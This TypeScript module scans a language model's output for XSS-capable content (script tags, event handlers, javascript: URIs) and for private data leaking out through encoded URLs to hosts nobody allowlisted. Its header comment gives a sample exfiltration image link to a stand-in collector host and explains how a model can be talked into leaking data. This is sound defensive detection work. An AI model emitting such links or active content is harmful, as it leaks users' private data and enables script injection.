/**
 * Model-output safety scan - the live lens for OWASP LLM02 (insecure output
 * handling). A model can be talked into emitting active/executable content
 * (a <script>, an event handler, a javascript: URI); if a downstream sink renders
 * that as HTML without escaping, the model's answer becomes an XSS vector. This
 * scans the model's FREE-TEXT output for that content before it leaves our
 * boundary.
 *
 * Precision-first (mirrors the platform-scan / ai-code detector philosophy):
 *   - Fenced and inline code are stripped first, so a legitimate code EXAMPLE of
 *     `<script>` in a ``` block is never flagged - only active content in the
 *     RENDERED prose is insecure output handling.
 *   - Each pattern matches a real, dangerous-if-rendered construct, not a broad
 *     "contains an angle bracket" heuristic.
 *
 * Pure + deterministic + I/O-free (unit-testable, safe to call on any hot path).
 * Most callers use it OBSERVE-ONLY: flag/record, never mutate the answer. A
 * caller whose output leaves the building unsupervised (the support auto-ack
 * reply) treats any finding as a block instead.
 *
 * EXFILTRATION THROUGH A URL (external_url_payload). A model that has read
 * something private can be talked into writing it into a link or an image
 * address: ![x](https://collector.example/p?d=<base64 of the data>). A renderer
 * that auto-loads the image sends the data with no click at all; a link sends
 * it on one click. The shape is what gives it away, not the host name: a host
 * nobody allowlisted, carrying a long run of encoded-looking characters in the
 * path, query or fragment. Ordinary links (a docs page, a slug, a UUID record
 * id) do not carry that, so they are not flagged.
 */
export type OutputRiskKind =
  | "script_tag"
  | "iframe_embed"
  | "js_uri"
  | "event_handler"
  | "data_html"
  /** A URL to a non-allowlisted host whose path/query/fragment carries a long
   *  encoded-looking value: the shape of data leaving through a link or image. */
  | "external_url_payload";

export interface OutputRisk {
  kind: OutputRiskKind;
  /** A short excerpt of what matched (for the audit trail; never the full text). */
  match: string;
}

/** Remove fenced ``` blocks and inline `code` so a code sample is not mistaken
 *  for active content. What remains is the prose a UI would render. */
function stripCode(text: string): string {
  return text.replace(/```[\s\S]*?```/g, " ").replace(/`[^`]*`/g, " ");
}

const PATTERNS: ReadonlyArray<{ kind: OutputRiskKind; re: RegExp }> = [
  { kind: "script_tag", re: /<\s*script\b/i },
  { kind: "iframe_embed", re: /<\s*(?:iframe|object|embed)\b/i },
  { kind: "js_uri", re: /\bjavascript:\s*[^\s"')]/i },
  { kind: "event_handler", re: /<[^>]+\son[a-z]+\s*=/i },
  { kind: "data_html", re: /\bdata:text\/html/i },
];

export interface ScanOptions {
  /** Hosts a URL in the output may point at without the payload check. An
   *  entry matches the host exactly or any subdomain of it ("example.com"
   *  allows "docs.example.com"). Relative links are always same-origin. */
  allowedHosts?: readonly string[];
}

/** Scan model free-text output for active/executable content (LLM02) and for
 *  data leaving through a URL. Returns one risk per distinct construct found;
 *  empty for safe output. */
export function scanModelOutput(text: string, opts: ScanOptions = {}): OutputRisk[] {
  if (!text) return [];
  const body = stripCode(text);
  const out: OutputRisk[] = [];
  for (const p of PATTERNS) {
    const m = body.match(p.re);
    if (m) out.push({ kind: p.kind, match: m[0].slice(0, 40) });
  }
  const exfil = findUrlPayloads(body, opts.allowedHosts ?? []);
  if (exfil.length > 0) out.push({ kind: "external_url_payload", match: exfil[0].slice(0, 40) });
  return out;
}

/* ------------------------------------------------------------------ */
/* external_url_payload                                                */
/* ------------------------------------------------------------------ */

/** Absolute http(s) URLs, bounded and linear. Stops at whitespace and the
 *  characters that close markdown, HTML attributes or prose. */
const URL_RE = /\bhttps?:\/\/[^\s<>"'`)\]]{1,2048}/gi;

/** The least a value must carry to count as a payload. Short tokens (a page
 *  number, a utm tag, a short id) are ordinary. */
const MIN_PAYLOAD_CHARS = 32;

const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

/** Every host a match is allowed against: exact, or a subdomain of an entry. */
export function hostAllowed(host: string, allowed: readonly string[]): boolean {
  const h = host.toLowerCase().replace(/\.$/, "");
  return allowed.some((entry) => {
    const a = entry.toLowerCase().replace(/^\*\./, "");
    return h === a || h.endsWith(`.${a}`);
  });
}

function shannonBitsPerChar(s: string): number {
  const counts = new Map<string, number>();
  for (const c of s) counts.set(c, (counts.get(c) ?? 0) + 1);
  let bits = 0;
  for (const n of counts.values()) {
    const p = n / s.length;
    bits -= p * Math.log2(p);
  }
  return bits;
}

/**
 * True when a URL component looks like encoded content rather than a word.
 *
 * Encoded data (base64, base64url, hex, percent-encoded bytes) is a long run of
 * one alphabet with high character entropy and mixed character classes. A slug
 * ("how-to-reset-your-password") is words joined by separators; a UUID is a
 * record id. Both are excluded so ordinary links never trip the rule.
 */
export function looksEncoded(raw: string): boolean {
  let value = raw;
  if (/%[0-9a-f]{2}/i.test(value)) {
    try {
      value = decodeURIComponent(value);
    } catch {
      /* malformed escapes: judge the raw form */
    }
  }
  /* Binary: control bytes or invalid-UTF-8 replacement characters are
     encoded data, not text in any language. URLSearchParams has already
     decoded a query value by the time it gets here, so this is checked on the
     decoded form. Non-ASCII letters (a query in Japanese, "café") are not. */
  const binary = value.match(/[\x00-\x08\x0e-\x1f\x7f\ufffd]/g);
  if (binary && binary.length >= 4) return true;
  if (value.length < MIN_PAYLOAD_CHARS) return false;
  if (UUID_RE.test(value)) return false;
  /* Hex: a long run of [0-9a-f] is a digest or hex-encoded bytes. */
  if (/^[0-9a-f]{32,}$/i.test(value)) return true;
  if (!/^[A-Za-z0-9+/=_.:-]+$/.test(value)) return false;
  /* Words joined by separators are a slug, not a payload. */
  const parts = value.split(/[-_.:]+/).filter(Boolean);
  if (parts.length >= 3 && parts.every((p) => /^[a-z]{1,14}$/i.test(p))) return false;
  const classes =
    Number(/[a-z]/.test(value)) + Number(/[A-Z]/.test(value)) + Number(/[0-9]/.test(value));
  return classes >= 2 && shannonBitsPerChar(value) >= 3.5;
}

/** Each path segment, query value and the fragment of a URL. */
function urlComponents(u: URL): string[] {
  const out: string[] = [];
  for (const seg of u.pathname.split("/")) if (seg) out.push(seg);
  for (const [k, v] of u.searchParams) {
    out.push(v);
    if (k.length >= MIN_PAYLOAD_CHARS) out.push(k);
  }
  if (u.hash.length > 1) out.push(u.hash.slice(1));
  return out;
}

/**
 * Every URL in the text that points at a non-allowlisted host and carries an
 * encoded-looking component. Returns the URLs (callers record a short excerpt,
 * never the payload in full).
 */
export function findUrlPayloads(text: string, allowedHosts: readonly string[] = []): string[] {
  if (!text) return [];
  const found: string[] = [];
  for (const m of text.matchAll(URL_RE)) {
    let u: URL;
    try {
      u = new URL(m[0]);
    } catch {
      continue;
    }
    if (hostAllowed(u.hostname, allowedHosts)) continue;
    if (urlComponents(u).some(looksEncoded)) found.push(m[0]);
  }
  return found;
}
